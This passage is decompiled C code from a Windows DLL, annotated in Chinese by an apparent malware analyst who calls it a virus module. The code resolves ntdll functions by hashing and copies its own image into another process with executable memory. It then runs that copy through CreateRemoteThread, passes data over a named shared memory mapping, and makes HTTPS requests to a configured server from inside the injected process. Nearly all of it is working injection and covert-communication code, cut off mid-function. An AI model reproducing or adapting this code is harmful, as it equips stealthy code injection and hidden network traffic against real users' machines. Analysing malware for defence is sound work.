      CloseHandle(*(HANDLE *)a2);
      return v2;
    }
    *v5 = 0;
    v5[1] = 0xFF000;
    v5[2] = 0;
    UnmapViewOfFile(v5);
    return 1;
  }
  return v2;
}

//----- (1000107F) --------------------------------------------------------
// 返回1代表成功
// __Out__ a2   按照前面的沟通过程, 这个应该是要读取的数据长度
int __cdecl bj_sub_1000107F_get_datalentoreceive(HANDLE hFileMappingObject, int a2)
{
  int v2; // esi
  signed int v3; // edi
  int *v4; // eax

  v2 = 0;
  v3 = 0;
  if ( hFileMappingObject )
  {
    if ( hFileMappingObject != (HANDLE)-1 )
    {
      v4 = (int *)MapViewOfFile(hFileMappingObject, 0xF001Fu, 0, 0, 0);
      if ( v4 )
      {
        if ( v4[1] == 0x1234ABCD )
        {
          v2 = *v4;
          if ( !*v4 )
            v4[1] = 0xDCBA4321;
          v3 = 1;
        }
        UnmapViewOfFile(v4);
      }
    }
  }
  if ( a2 )
    *(_DWORD *)a2 = v2;
  return v3;
}

//----- (100010D6) --------------------------------------------------------
int __cdecl bj_sub_100010D6_OpenFileMapping(LPCSTR lpName, int a2)
{
  int v2; // esi
  HANDLE v3; // eax

  v2 = 0;
  v3 = OpenFileMappingA(0xF001Fu, 0, lpName);
  *(_DWORD *)a2 = v3;
  if ( v3 && v3 != (HANDLE)-1 )
    return 1;
  *(_DWORD *)a2 = 0;
  return v2;
}

//----- (10001103) --------------------------------------------------------
// 
// a2          存放读取到的数据的缓冲区地址
// __InOut__ a3  读取到的数据长度
// 
// 返回1代表操作成功.
int __cdecl bj_sub_10001103_cpyfromview(HANDLE hFileMappingObject, int a2, int a3)
{
  signed int v3; // edi
  int v4; // ecx
  int *v5; // eax
  int *v6; // esi
  int v7; // ecx
  signed int v8; // ebx
  int v9; // eax
  int v11; // [esp+4h] [ebp-4h]
  char *hFileMappingObjecta; // [esp+10h] [ebp+8h]

  v3 = 0;
  v4 = 0;
  v11 = 0;
  if ( hFileMappingObject && hFileMappingObject != (HANDLE)-1 )
  {
    v5 = (int *)MapViewOfFile(hFileMappingObject, 0xF001Fu, 0, 0, 0);
    v6 = v5;
    if ( v5 )
    {
      if ( v5[1] == 0x1234ABCD )
      {
        v7 = *v5;
        if ( *(_DWORD *)a3 >= (unsigned int)*v5 )// 说明用于存放的空间足够大
        {
          v5[1] = 0xDCBA4321;
          v8 = 0;
          if ( v7 )
          {
            while ( !v8 )
            {
              hFileMappingObjecta = 0;
              if ( v6[1] == 0x98761234 )        // 他这里应该是分多次拷贝.
                                                // 其中v6[0]保存着 总数据量
                                                // v6[1]作为控制标志
                                                // v6[2]保存着 此次拷贝的数据字节数.
              {
LABEL_14:
                bj_sub_10003271_cpy(a2, (_BYTE *)v6 + 0xC, v6[2]);
                v9 = v6[2];
                a2 += v9;
                v11 += v9;
                *v6 -= v9;
                v6[1] = 0x43216789;             // 很牛逼.. 下次进入循环,就会跑到else处, 等待远程进程准备好下一块数据块
              }
              else
              {
                while ( !v8 )
                {
                  Sleep(0xC8u);
                  if ( ++hFileMappingObjecta == (char *)0x258 )
                    v8 = 1;
                  if ( v6[1] == 0x98761234 )
                  {
                    if ( v8 )
                      break;
                    goto LABEL_14;
                  }
                }
              }
              if ( !*v6 )                       // 代表所有的数据都已经拷贝完毕
              {
                if ( !v8 )
                  goto LABEL_18;
                break;
              }
            }
            *v6 = 0;
            v6[1] = 0xFF000;
            v6[2] = 0;
          }
          else
          {
LABEL_18:
            v3 = 1;
          }
        }
      }
      UnmapViewOfFile(v6);
      v4 = v11;
    }
    else
    {
      v4 = 0;
    }
  }
  if ( a3 )
    *(_DWORD *)a3 = v4;
  return v3;
}

//----- (10001205) --------------------------------------------------------
// arg2: 数据地址
// arg3: 数据长度
// 返回1代表成功,返回0,代表始终没等到远程进程的操作.
int __cdecl bj_sub_10001205(HANDLE hFileMappingObject, int a2, int a3)
{
  signed int v3; // edi
  _DWORD *v4; // eax
  _DWORD *v5; // esi
  signed int v6; // ebx
  char *hFileMappingObjecta; // [esp+Ch] [ebp+8h]
  char *hFileMappingObjectb; // [esp+Ch] [ebp+8h]

  v3 = 0;
  if ( hFileMappingObject )
  {
    if ( hFileMappingObject != (HANDLE)-1 )
    {
      v4 = MapViewOfFile(hFileMappingObject, 0xF001Fu, 0, 0, 0);
      v5 = v4;
      if ( v4 )
      {
        if ( v4[1] == 0xFF000 )
        {
          *v4 = a3;
          v6 = 0;
          v4[1] = 0x1234ABCD;
          hFileMappingObjecta = 0;
          while ( !v6 )
          {
            Sleep(0xC8u);
            if ( ++hFileMappingObjecta == (char *)0x258 )
              v6 = 1;
            if ( v5[1] == 0xDCBA4321 )          // 前面设了0x1234abcd, 这里判断dcba4321, 应该是远程进程中的代码修改的.
                                                // 相当于一个控制指令吧..
            {
              if ( !v6 )
              {
                while ( *v5 && !v6 )
                {
                  if ( *v5 >= 0x10000u )        // 保证字节数不过大
                    v5[2] = 0x10000;
                  else
                    v5[2] = *v5;
                  bj_sub_10003271_cpy((int)(v5 + 3), (_BYTE *)a2, v5[2]);
                  a2 += v5[2];
                  v5[1] = 0x98761234;
                  hFileMappingObjectb = 0;
                  do
                  {
                    if ( v6 )
                      break;
                    Sleep(0xC8u);
                    if ( ++hFileMappingObjectb == (char *)600 )
                      v6 = 1;
                  }
                  while ( v5[1] != 0x43216789 );// 等待远程进程使用完毕本进程拷贝到view中的数据.
                }
                *v5 = 0;
                v5[2] = 0;
                v5[1] = 0xFF000;
                if ( !v6 )
                  v3 = 1;
              }
              break;
            }
          }
        }
        UnmapViewOfFile(v5);
      }
    }
  }
  return v3;
}

//----- (1000131E) --------------------------------------------------------
BOOL __cdecl bj_sub_1000131E_ZwFreeVirtualMemory(HANDLE hProcess, int a2)
{
  HANDLE v2; // edi
  BOOL v3; // esi
  int *hntdll; // eax
  int (__stdcall *bj_ZwFreeVirtualMemory)(HANDLE, int *, int *, signed int); // eax
  int v7; // [esp+8h] [ebp-4h]

  v2 = hProcess;
  v3 = 0;
  if ( hProcess )
  {
    if ( hProcess != (HANDLE)-1 )
    {
      if ( a2 )
      {
        hProcess = 0;
        GetExitCodeProcess(v2, (LPDWORD)&hProcess);
        if ( hProcess == HANDLE_FLAG_PROTECT_FROM_CLOSE|HANDLE_FLAG_INHERIT|0x100 )
        {
          hntdll = bj_sub_10002609_finddllbasebyunicodenamehash(0xA4137E37, 1, 0);
          if ( hntdll )
          {
            bj_ZwFreeVirtualMemory = (int (__stdcall *)(HANDLE, int *, int *, signed int))bj_sub_10002661_getprocaddrbyasciinamehash(
                                                                                            (int)hntdll,
                                                                                            0xB9016A44,
                                                                                            1,
                                                                                            0);
            if ( bj_ZwFreeVirtualMemory )
            {
              v7 = 0;
              v3 = bj_ZwFreeVirtualMemory(v2, &a2, &v7, 0x8000) == 0;
            }
          }
        }
      }
    }
  }
  return v3;
}

//----- (10001399) --------------------------------------------------------
// __out__ a2  返回的是 写入到目标进程中病毒模块的基址
// 
// 返回值是  1, (如果远程进程的操作成功,线程退出值为1)
int __cdecl bj_sub_10001399_injectanddosth_do_sub_10001545(HANDLE hProcess, int a2)
{
  HANDLE v2; // edi
  signed int returnvalue; // esi
  int *hntdll; // eax
  int v5; // ebx
  unsigned int v6; // eax
  _DWORD *v7; // ebx
  int v8; // eax
  DWORD v9; // eax
  HANDLE v10; // eax
  void *v11; // edi
  void (__stdcall *bj_ZwFreeVirtualMemory)(HANDLE, HANDLE *, DWORD *, signed int); // [esp+8h] [ebp-14h]
  int (__stdcall *bj_ZwWriteVirtualMemory)(HANDLE, HANDLE, void *, DWORD, _DWORD); // [esp+Ch] [ebp-10h]
  int (__stdcall *bj_ZwAllocateVirtualMemory)(HANDLE, HANDLE *, _DWORD, DWORD *, signed int, signed int); // [esp+10h] [ebp-Ch]
  void *lpMema; // [esp+10h] [ebp-Ch]
  DWORD ExitCode; // [esp+14h] [ebp-8h]
  DWORD SizeOfImage; // [esp+18h] [ebp-4h]

  v2 = hProcess;
  returnvalue = 0;
  if ( hProcess )
  {
    if ( a2 )
    {
      hntdll = bj_sub_10002609_finddllbasebyunicodenamehash(0xA4137E37, 1, 0);
      v5 = (int)hntdll;
      if ( hntdll )
      {
        bj_ZwAllocateVirtualMemory = (int (__stdcall *)(HANDLE, HANDLE *, _DWORD, DWORD *, signed int, signed int))bj_sub_10002661_getprocaddrbyasciinamehash((int)hntdll, 0x77B826B3, 1, 0);
        bj_ZwWriteVirtualMemory = (int (__stdcall *)(HANDLE, HANDLE, void *, DWORD, _DWORD))bj_sub_10002661_getprocaddrbyasciinamehash(
                                                                                              v5,
                                                                                              0x2E33C8AC,// ZwWriteVirtualMemory
                                                                                              1,
                                                                                              0);
        v6 = bj_sub_10002661_getprocaddrbyasciinamehash(v5, 0xB9016A44, 1, 0);// ZwFreeVirtualMemory
        bj_ZwFreeVirtualMemory = (void (__stdcall *)(HANDLE, HANDLE *, DWORD *, signed int))v6;
        if ( bj_ZwAllocateVirtualMemory )
        {
          if ( bj_ZwWriteVirtualMemory )
          {
            if ( v6 )
            {
              v7 = (_DWORD *)bj_sub_100024C9_findImagebase((_DWORD (__cdecl *)(_DWORD))bj_sub_10001399_injectanddosth_do_sub_10001545);// 这个是函数自己啊
              if ( v7 )
              {
                if ( *(_WORD *)v7 == 0x5A4D )
                {
                  v8 = v7[0xF];
                  if ( *(_DWORD *)((char *)v7 + v8) == 0x4550 )
                  {
                    ExitCode = *(_DWORD *)((char *)v7 + v8 + 0x50);// SizeOfImage
                    SizeOfImage = ExitCode;
                    hProcess = 0;
                    if ( !bj_ZwAllocateVirtualMemory(v2, &hProcess, 0, &SizeOfImage, 0x3000, 0x40)// MEM_COMMIT|MEM_RESERVE,  PAGE_EXECUTE_READWRITE
                      && SizeOfImage >= ExitCode )
                    {
                      lpMema = bj_sub_1000295A_alloc(ExitCode);
                      bj_strcpy_sub_100029F9((unsigned int)lpMema, v7, ExitCode);// 本进程中新分配了一块空间,然后把本模块拷贝到本地空间
                      if ( !bj_sub_10002C39_relocatingOperation((int)lpMema, (int)hProcess)// 重定位操作
                        || bj_ZwWriteVirtualMemory(v2, hProcess, lpMema, ExitCode, 0) )// 此时hProcess是目标进程中分配的空间的地址
                      {
                        SizeOfImage = 0;
                        bj_ZwFreeVirtualMemory(v2, &hProcess, &SizeOfImage, 0x8000);
                      }
                      else                      // 如果成功了
                      {
                        ExitCode = 0;
                        if ( v2 == (HANDLE)-1 ) // 为什么这里要加个这样的判断..
                        {
                          v9 = bj_sub_10002B15((int)hProcess);
                        }
                        else
                        {
                          v10 = CreateRemoteThread(
                                  v2,
                                  0,
                                  0,
                                  (LPTHREAD_START_ROUTINE)((char *)bj_sub_10001545_FillIATWithProperAddress
                                                         + (_BYTE *)hProcess
                                                         - (_BYTE *)v7),
                                  hProcess,     // 模块基址给他传过去了
                                  0,
                                  0);
                          v11 = v10;
                          if ( v10 )
                          {
                            WaitForSingleObject(v10, 30000u);
                            GetExitCodeThread(v11, &ExitCode);
                          }
                          v9 = ExitCode;
                        }
                        if ( v9 == 1 )
                        {
                          returnvalue = 1;      // 这应该是,如果操作成功了
                          *(_DWORD *)a2 = hProcess;
                        }
                      }
                      bj_sub_10002A8F_free(lpMema);
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  return returnvalue;
}
/* Orphan comments:
ZwAllocateVirtualMemory
*/

//----- (10001545) --------------------------------------------------------
// a1 是病毒模块基址
int __stdcall bj_sub_10001545_FillIATWithProperAddress(int a1)
{
  return bj_sub_10002B15(a1);
}

//----- (10001555) --------------------------------------------------------
// 其他都是废话,主要就是在目标进程中执行了arg3
HANDLE __cdecl bj_sub_10001555_dosth_do_sub_arg3(HANDLE hProcess, int modulebaseintargetprocess, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, int a5)
{
  HANDLE v5; // ebx
  int v6; // esi
  int v7; // edi
  unsigned int v9; // eax

  v5 = hProcess;
  v6 = 0;
  if ( hProcess )
  {
    v7 = modulebaseintargetprocess;
    if ( modulebaseintargetprocess )
    {
      if ( lpStartAddress )
      {
        if ( hProcess == (HANDLE)-1 )
          return CreateThread(0, 0, lpStartAddress, lpParameter, 0, 0);
        hProcess = 0;
        GetExitCodeProcess(v5, (LPDWORD)&hProcess);
        if ( hProcess == HANDLE_FLAG_PROTECT_FROM_CLOSE|HANDLE_FLAG_INHERIT|0x100 )
        {
          v9 = a5;
          if ( !a5 )
            v9 = bj_sub_100024C9_findImagebase((_DWORD (__cdecl *)(_DWORD))bj_sub_10001399_injectanddosth_do_sub_10001545);
          return CreateRemoteThread(
                   v5,
                   0,
                   0,
                   (LPTHREAD_START_ROUTINE)((char *)lpStartAddress + v7 - v9),
                   lpParameter,
                   0,
                   0);
        }
      }
    }
  }
  return (HANDLE)v6;
}

//----- (100015CD) --------------------------------------------------------
BOOL __cdecl bj_sub_100015CD_allfree(LPVOID *a1)
{
  BOOL result; // eax

  if ( *a1 )
    result = bj_sub_10002A8F_free(*a1);
  if ( a1[2] )
    result = bj_sub_10002A8F_free(a1[2]);
  if ( a1[3] )
    result = bj_sub_10002A8F_free(a1[3]);
  if ( a1[4] )
    result = bj_sub_10002A8F_free(a1[4]);
  if ( a1[5] )
    result = bj_sub_10002A8F_free(a1[5]);
  if ( a1[6] )
    result = bj_sub_10002A8F_free(a1[6]);
  if ( a1[7] )
    result = bj_sub_10002A8F_free(a1[7]);
  if ( a1[8] )
    result = bj_sub_10002A8F_free(a1[8]);
  if ( a1[9] )
    result = bj_sub_10002A8F_free(a1[9]);
  return result;
}

//----- (1000165C) --------------------------------------------------------
char *__cdecl bj_sub_1000165C(int *a1, int a2, _DWORD *a3)
{
  int *v3; // esi
  int v4; // edi
  char *v5; // ecx
  int *v6; // ebx
  int *i; // ecx
  char *v8; // eax
  int *v9; // edx
  int v10; // eax
  int v11; // esi
  int v12; // eax

  v3 = a1;
  v4 = 0;
  v5 = 0;
  if ( a1 && a2 )
  {
    v6 = (int *)((char *)a1 + a2);
    for ( i = a1; i < v6; i = (int *)((char *)i + *i + 4) )
      ++v4;
    v8 = (char *)bj_sub_1000295A_alloc(8 * v4);
    v5 = v8;
    if ( a1 < v6 )
    {
      v9 = (int *)(v8 + 4);
      do
      {
        v10 = *v3;
        v11 = (int)(v3 + 1);
        *v9 = v10;
        v12 = 0;
        if ( *v9 )
          v12 = v11;
        v3 = (int *)(*v9 + v11);
        *(v9 - 1) = v12;
        v9 += 2;
      }
      while ( v3 < v6 );
    }
  }
  if ( a3 )
    *a3 = v4;
  return v5;
}

//----- (100016C8) --------------------------------------------------------
// a1==UserAgentString *a2==0
int __cdecl bj_sub_100016C8(int a1, int *a2)
{
  int v2; // edi
  int v3; // esi
  void *v4; // ebx
  HANDLE v5; // ecx
  DWORD v6; // esi
  int v8; // [esp+Ch] [ebp-18h]
  int v9; // [esp+10h] [ebp-14h]
  HANDLE hHandle; // [esp+14h] [ebp-10h]
  int v11; // [esp+18h] [ebp-Ch]
  int v12; // [esp+1Ch] [ebp-8h]
  HANDLE hObject; // [esp+20h] [ebp-4h]

  v2 = 0;
  v3 = 0;
  v11 = 0;
  v9 = 0;
  v8 = 0;
  v4 = (void *)bj_sub_10002CF7_getpreselectedprocesshandle((int)&v8);
  if ( v4 )
  {
    v12 = 0;
    bj_sub_10001399_injectanddosth_do_sub_10001545(v4, (int)&v12);
    if ( v12 )
    {
      hHandle = bj_sub_10001555_dosth_do_sub_arg3(v4, v12, (LPTHREAD_START_ROUTINE)bj_sub_10001A63, 0, 0);
      if ( !hHandle )
        goto LABEL_19;
      v5 = 0;
      hObject = 0;
      do
      {
        if ( v3 == 600 )
          break;
        Sleep(0xC8u);
        ++v3;
        bj_sub_100010D6_OpenFileMapping("DGMNOEP", (int)&hObject);
        v5 = hObject;
      }
      while ( !hObject );
      if ( v5 )
      {
        if ( bj_sub_10002154_collectdata_cpy2view(v5, a1) )
        {
          bj_sub_10001E2F(hObject, (int)&v9, (int)&v11);
          v2 = v11;
        }
        bj_closehandle_sub_10001000(hObject);
      }
      v6 = WaitForSingleObject(hHandle, 0x1D4C0u);
      CloseHandle(hHandle);
      if ( !v6 )
LABEL_19:
        bj_sub_1000131E_ZwFreeVirtualMemory(v4, v12);
    }
    bj_sub_10002D6C_ZwClose((int)v4);
    v3 = v9;
  }
  if ( a2 )
    *a2 = v2;
  return v3;
}

//----- (100017CA) --------------------------------------------------------
int __cdecl bj_sub_100017CA(int a1, int *a2)
{
  int v2; // edi
  int v3; // esi
  void *v4; // ebx
  HANDLE v5; // ecx
  DWORD v6; // esi
  int v8; // [esp+Ch] [ebp-18h]
  int v9; // [esp+10h] [ebp-14h]
  HANDLE hHandle; // [esp+14h] [ebp-10h]
  int v11; // [esp+18h] [ebp-Ch]
  int v12; // [esp+1Ch] [ebp-8h]
  HANDLE hObject; // [esp+20h] [ebp-4h]

  v2 = 0;
  v3 = 0;
  v11 = 0;
  v9 = 0;
  v8 = 0;
  v4 = (void *)bj_sub_10002CF7_getpreselectedprocesshandle((int)&v8);
  if ( v4 )
  {
    v12 = 0;
    bj_sub_10001399_injectanddosth_do_sub_10001545(v4, (int)&v12);
    if ( v12 )
    {
      hHandle = bj_sub_10001555_dosth_do_sub_arg3(v4, v12, (LPTHREAD_START_ROUTINE)bj_sub_100018CC, 0, 0);
      if ( !hHandle )
        goto LABEL_19;
      v5 = 0;
      hObject = 0;
      do
      {
        if ( v3 == 600 )
          break;
        Sleep(0xC8u);
        ++v3;
        bj_sub_100010D6_OpenFileMapping("DGMNOEP", (int)&hObject);
        v5 = hObject;
      }
      while ( !hObject );
      if ( v5 )
      {
        if ( bj_sub_10002154_collectdata_cpy2view(v5, a1) )
        {
          bj_sub_10001E2F(hObject, (int)&v9, (int)&v11);
          v2 = v11;
        }
        bj_closehandle_sub_10001000(hObject);
      }
      v6 = WaitForSingleObject(hHandle, 0x1D4C0u);
      CloseHandle(hHandle);
      if ( !v6 )
LABEL_19:
        bj_sub_1000131E_ZwFreeVirtualMemory(v4, v12);
    }
    bj_sub_10002D6C_ZwClose((int)v4);
    v3 = v9;
  }
  if ( a2 )
    *a2 = v2;
  return v3;
}

//----- (100018CC) --------------------------------------------------------
int __stdcall bj_sub_100018CC(LPVOID lpThreadParameter)
{
  int v1; // ebx
  void *v2; // edi
  unsigned int v3; // eax
  unsigned int v4; // eax
  void *v5; // esi
  unsigned int v6; // eax
  void *v7; // eax
  _BYTE *v8; // edi
  char Mem; // [esp+4h] [ebp-68h]
  LPCSTR lpszAgent; // [esp+2Ch] [ebp-40h]
  DWORD dwAccessType; // [esp+30h] [ebp-3Ch]
  LPCSTR lpszProxy; // [esp+34h] [ebp-38h]
  LPCSTR lpszServerName; // [esp+38h] [ebp-34h]
  LPVOID lpBuffer; // [esp+3Ch] [ebp-30h]
  LPVOID v16; // [esp+40h] [ebp-2Ch]
  LPCSTR lpszVerb; // [esp+44h] [ebp-28h]
  LPCSTR lpszObjectName; // [esp+48h] [ebp-24h]
  LPVOID lpOptional; // [esp+50h] [ebp-1Ch]
  HINTERNET hInternet; // [esp+54h] [ebp-18h]
  void *v21; // [esp+58h] [ebp-14h]
  void *v22; // [esp+5Ch] [ebp-10h]
  LPVOID lpMem; // [esp+60h] [ebp-Ch]
  HANDLE hObject; // [esp+64h] [ebp-8h]
  DWORD dwNumberOfBytesRead; // [esp+68h] [ebp-4h]

  v1 = 0;
  hObject = 0;
  if ( bj_sub_1000100E_CreateIfNotExists_FileMapping("DGMNOEP", (int)&hObject) && hObject )
  {
    qmemcpy(&lpszAgent, bj_sub_10001C39_cpyfromview(&Mem, hObject), 0x28u);
    hInternet = InternetOpenA(lpszAgent, dwAccessType, lpszProxy, 0, 0);
    v2 = InternetConnectA(hInternet, lpszServerName, 0x1BBu, 0, 0, 3u, 0, 0);
    v21 = v2;
    if ( bj_sub_10002D28_strlen((int)lpBuffer) && bj_sub_10002D28_strlen((int)v16) )
    {
      v3 = bj_sub_10002D28_strlen((int)lpBuffer);
      InternetSetOptionA(v2, 0x2Bu, lpBuffer, v3);
      v4 = bj_sub_10002D28_strlen((int)v16);
      InternetSetOptionA(v2, 0x2Cu, v16, v4);
    }
    v5 = HttpOpenRequestA(v2, lpszVerb, lpszObjectName, 0, 0, 0, 0x800000u, 0);
    bj_sub_10001D56(v5);
    v6 = bj_sub_10002D28_strlen((int)lpOptional);
    if ( HttpSendRequestA(v5, 0, 0, lpOptional, v6) )
    {
      dwNumberOfBytesRead = -1;
      v7 = bj_sub_1000295A_alloc(0x10000u);
      v22 = v7;
      lpMem = 0;
      if ( dwNumberOfBytesRead )
      {
        v8 = v7;
        do
        {
          InternetReadFile(v5, v8, 0x10000u, &dwNumberOfBytesRead);
          if ( !dwNumberOfBytesRead )
            break;
          lpMem = bj_realloc_sub_10002AAD(lpMem, v1 + dwNumberOfBytesRead);
          bj_sub_10003271_cpy((int)lpMem + v1, v8, dwNumberOfBytesRead);
          v1 += dwNumberOfBytesRead;
        }
        while ( dwNumberOfBytesRead );
        v2 = v21;
        v7 = v22;
      }
      bj_sub_10002A8F_free(v7);
      bj_sub_10001EB1_cpy2view(hObject, (int)lpMem, v1);
    }
    InternetCloseHandle(v5);
    InternetCloseHandle(v2);
    InternetCloseHandle(hInternet);
    bj_sub_100015CD_allfree((LPVOID *)&lpszAgent);
    bj_closehandle_sub_10001000(hObject);
  }
  return 0;
}

//----- (10001A63) --------------------------------------------------------
int __stdcall bj_sub_10001A63(LPVOID lpThreadParameter)
{
  DWORD v1; // ebx
  void *v2; // edi
  unsigned int v3; // eax
  unsigned int v4; // eax
  void *v5; // esi
  unsigned int v6; // eax
  char *v7; // eax
  DWORD v8; // ecx
  char *v9; // edi
  char Mem; // [esp+4h] [ebp-6Ch]
  LPCSTR lpszAgent; // [esp+2Ch] [ebp-44h]
  DWORD dwAccessType; // [esp+30h] [ebp-40h]
  LPCSTR lpszProxy; // [esp+34h] [ebp-3Ch]
  LPCSTR lpszServerName; // [esp+38h] [ebp-38h]
  LPVOID lpBuffer; // [esp+3Ch] [ebp-34h]
  LPVOID v17; // [esp+40h] [ebp-30h]
  LPCSTR lpszVerb; // [esp+44h] [ebp-2Ch]
  LPCSTR lpszObjectName; // [esp+48h] [ebp-28h]
  LPVOID lpOptional; // [esp+50h] [ebp-20h]
  HINTERNET hInternet; // [esp+54h] [ebp-1Ch]
  void *v22; // [esp+58h] [ebp-18h]
  int Buffer; // [esp+5Ch] [ebp-14h]
  DWORD dwNumberOfBytesRead; // [esp+60h] [ebp-10h]
  DWORD dwBufferLength; // [esp+64h] [ebp-Ch]
  DWORD dwNumberOfBytesToRead; // [esp+68h] [ebp-8h]
  HANDLE hObject; // [esp+6Ch] [ebp-4h]

  v1 = 0;
  hObject = 0;
  if ( bj_sub_1000100E_CreateIfNotExists_FileMapping("DGMNOEP", (int)&hObject) && hObject )
  {
    qmemcpy(&lpszAgent, bj_sub_10001C39_cpyfromview(&Mem, hObject), 0x28u);
    hInternet = InternetOpenA(lpszAgent, dwAccessType, lpszProxy, 0, 0);
    v2 = InternetConnectA(hInternet, lpszServerName, 0x1BBu, 0, 0, 3u, 0, 0);
    v22 = v2;
    if ( bj_sub_10002D28_strlen((int)lpBuffer) && bj_sub_10002D28_strlen((int)v17) )
    {
      v3 = bj_sub_10002D28_strlen((int)lpBuffer);
      InternetSetOptionA(v2, 0x2Bu, lpBuffer, v3);
      v4 = bj_sub_10002D28_strlen((int)v17);
      InternetSetOptionA(v2, 0x2Cu, v17, v4);
    }
    v5 = HttpOpenRequestA(v2, lpszVerb, lpszObjectName, 0, 0, 0, 0x800000u, 0);
    bj_sub_10001D56(v5);
    v6 = bj_sub_10002D28_strlen((int)lpOptional);
    if ( HttpSendRequestA(v5, 0, 0, lpOptional, v6) )
    {
      Buffer = 0;
      dwBufferLength = 4;
      HttpQueryInfoA(v5, 0x20000013u, &Buffer, &dwBufferLength, 0);
      if ( Buffer == 200 )
      {
        dwBufferLength = 4;
        dwNumberOfBytesToRead = 0;
        if ( HttpQueryInfoA(v5, 0x20000005u, &dwNumberOfBytesToRead, &dwBufferLength, 0) && dwNumberOfBytesToRead > 0x24 )
        {
          v7 = (char *)bj_sub_1000295A_alloc(dwNumberOfBytesToRead);
          v8 = dwNumberOfBytesToRead;
          v9 = v7;
          dwNumberOfBytesRead = 0;
          do
          {
            InternetReadFile(v5, &v9[v1], v8, &dwNumberOfBytesRead);
            v1 += dwNumberOfBytesRead;
            v8 = dwNumberOfBytesToRead;
          }
          while ( dwNumberOfBytesRead && v1 < dwNumberOfBytesToRead );
          if ( v1 == dwNumberOfBytesToRead )
            bj_sub_10001EB1_cpy2view(hObject, (int)v9, dwNumberOfBytesToRead);
          bj_sub_10002A8F_free(v9);
          v2 = v22;
        }
      }
      else
      {
        bj_sub_10001EB1_cpy2view(hObject, (int)"2", 1);
      }
    }
    InternetCloseHandle(v5);
    InternetCloseHandle(v2);
    InternetCloseHandle(hInternet);
    bj_sub_100015CD_allfree((LPVOID *)&lpszAgent);
    bj_closehandle_sub_10001000(hObject);
  }
  return 0;
}

//----- (10001C39) --------------------------------------------------------
// 把传过来的数据重新解析,放到新分配出来的缓冲区中.
_DWORD *__cdecl bj_sub_10001C39_cpyfromview(LPVOID lpMem, HANDLE hFileMappingObject)
{
  _DWORD *v2; // ebx
  char *v3; // edi
  int *v4; // edi
  int *v5; // eax
  int *v6; // esi
  int v8; // [esp+Ch] [ebp-4h]

  v2 = lpMem;
  v3 = (char *)lpMem + 4;
  *(_DWORD *)lpMem = 0;
  memset(v3, 0, 0x24u);
  v8 = 0;
  lpMem = 0;
  if ( bj_sub_10001E2F(hFileMappingObject, (int)&lpMem, (int)&v8) )
  {
    v4 = (int *)lpMem;
    if ( lpMem )
    {
      lpMem = 0;
      v5 = (int *)bj_sub_1000165C(v4, v8, &lpMem);
      v6 = v5;
      if ( v5 && lpMem )
      {
        *v2 = bj_saveinnewheap_sub_10002AE7(*v5, v5[1] + 1);
        v2[1] = *(_DWORD *)v6[2];
        v2[2] = bj_saveinnewheap_sub_10002AE7(v6[4], v6[5] + 1);
        v2[3] = bj_saveinnewheap_sub_10002AE7(v6[6], v6[7] + 1);
        v2[4] = bj_saveinnewheap_sub_10002AE7(v6[8], v6[9] + 1);
        v2[5] = bj_saveinnewheap_sub_10002AE7(v6[10], v6[11] + 1);
        v2[6] = bj_saveinnewheap_sub_10002AE7(v6[12], v6[13] + 1);
        v2[7] = bj_saveinnewheap_sub_10002AE7(v6[14], v6[15] + 1);
        v2[8] = bj_saveinnewheap_sub_10002AE7(v6[16], v6[17] + 1);
        v2[9] = bj_saveinnewheap_sub_10002AE7(v6[18], v6[19] + 1);
        bj_sub_10002A8F_free(v6);
      }
      bj_sub_10002A8F_free(v4);
    }
  }
  return v2;
}

//----- (10001D56) --------------------------------------------------------
BOOL __cdecl bj_sub_10001D56(HINTERNET hInternet)
{
  DWORD dwBufferLength; // [esp+0h] [ebp-8h]
  int Buffer; // [esp+4h] [ebp-4h]

  dwBufferLength = 4;
  InternetQueryOptionA(hInternet, 0x1Fu, &Buffer, &dwBufferLength);
  Buffer |= 0x3180u;
  return InternetSetOptionA(hInternet, 0x1Fu, &Buffer, 4u);
}

//----- (10001D91) --------------------------------------------------------
// (unsigned int)v3, 0xA, (SIZE_T *)&v45
LPVOID __cdecl bj_sub_10001D91(unsigned int a1, int a2, SIZE_T *a3)
{
  SIZE_T v3; // ebx
  unsigned int v4; // edi
  LPVOID v5; // ecx
  unsigned int v6; // esi
  unsigned int v7; // ecx
  LPVOID v8; // eax
  unsigned int v9; // esi
  unsigned int *v10; // edi
  unsigned int v11; // ebx
  int v12; // esi
  SIZE_T v14; // [esp+Ch] [ebp-4h]
  LPVOID v15; // [esp+18h] [ebp+8h]

  v3 = 0;
  v4 = a1;
  v5 = 0;
  v14 = 0;
  if ( a1 && a2 )
  {
    v6 = a1 + 8 * a2;                           // 末尾的后一个位置
    v7 = a1;
    if ( a1 < v6 )
    {
      do
      {
        v3 += *(_DWORD *)(v7 + 4) + 4;
        v7 += 8;
      }
      while ( v7 < v6 );                        // 这个循环应该是用于计算所需空间大小, 把所有字符串直接放到空间内, 所需要的空间,而不是存放字符串指针.
      v14 = v3;
    }
    v8 = bj_sub_1000295A_alloc(v3);
    v5 = v8;
    v15 = v8;
    if ( v4 < v6 )
    {
      v9 = v6 - v4 - 1;
      v10 = (unsigned int *)(v4 + 4);
      v11 = (unsigned int)v8;
      v12 = (v9 >> 3) + 1;
      do
      {
        bj_strcpy_sub_100029F9(v11, v10, 4u);
        v11 += 4;
        if ( *(v10 - 1) && *v10 )
        {
          bj_strcpy_sub_100029F9(v11, (_DWORD *)*(v10 - 1), *v10);
          v11 += *v10;
        }
        v10 += 2;
        --v12;
      }
      while ( v12 );                            // 果然,v8这个新分配的空间,就是v13里面的数据,先4个字节长度,然后紧跟着字符串,然后再4个字节长度,然后再跟着字符串, 一直把v13搞完.
      v3 = v14;
      v5 = v15;
    }
  }
  if ( a3 )
    *a3 = v3;
  return v5;                                    // 返回拼凑完的缓冲区, arg3是长度
}

//----- (10001E2F) --------------------------------------------------------
// __Out__ a2   返回的数据缓冲区地址
// __Out__ a3   返回的数据长度
// 返回1代表操作失败
int __cdecl bj_sub_10001E2F(HANDLE hFileMappingObject, int a2, int a3)
{
  int v3; // eax
  int v4; // esi
  int v5; // ebx
  bool v6; // zf
  LPVOID v7; // eax
  int v9; // [esp+8h] [ebp-4h]

  v3 = 0;
  v4 = 0;
  v9 = 0;
  if ( a2 )
  {
    *(_DWORD *)a2 = 0;
    v5 = 0;
    do
    {
      if ( v4 )
        break;
      Sleep(0xC8u);
      ++v5;
